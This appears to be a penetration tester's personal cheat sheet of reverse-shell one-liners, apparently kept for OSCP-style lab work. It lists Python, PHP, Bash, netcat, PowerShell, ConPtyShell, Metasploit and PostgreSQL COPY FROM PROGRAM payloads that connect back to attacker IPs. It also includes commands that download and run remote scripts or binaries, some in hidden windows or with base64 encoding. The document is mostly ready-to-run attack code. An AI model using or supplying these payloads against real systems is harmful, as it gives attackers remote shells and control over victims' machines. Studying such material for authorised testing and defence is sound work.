#shells #reverseShells #bindshells 

[[MSFVENOM]]
🔴 If the shell is not stable, try to migrate it to a socat or nc
### Python as an argument

```bash
'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.189\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'  
```

### Linux NC

🔴 If webserver doesnt get a hit try without http:// , ex wget 192.168.45.189

```bash
wget "http://192.168.45.189/nc" -O /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/bash 192.168.45.189 443
```
### Resources

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### PHP

```php
$sock=fsockopen("192.168.45.175",443);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

### Bash

```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.157 443 >/tmp/f" >> this_is_fine.sh
```

### Powershell

#### 1

```bash
pwsh
```

```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

```powershell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```

```powershell
$EncodedText =[Convert]::ToBase64String($Bytes)
```

```powershell
$EncodedText
```

execute it with

```powershell
powershell.exe  -WindowStyle hidden -e asdasdefefa
```

#### 2

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

```bash
python3 -m http.server 80
```

```bash
nc -nvlp 4444
```

```bash
powershell.exe  -WindowStyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.164:8000/powercat.ps1'); powercat -c 192.168.45.164 -p 4444 -e powershell"
```


### Conpty Shell

```bash
cd oscp/Windows_Tools
```

```bash
sudo python3 -m http.server 80
```

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 443
```

```powershell
IEX(IWR http://192.168.45.169/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.169 443
```

### Meterpreter OneLiner

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```


### POSTGRESQL

```bash
psql -h 192.168.220.108 -p 5432 -U 'postgres'
```

```psql
CREATE TABLE demo(t text);
```

```psql
COPY demo FROM PROGRAM 'sh -i >& /dev/tcp/192.168.45.156/80 0>&1';
```
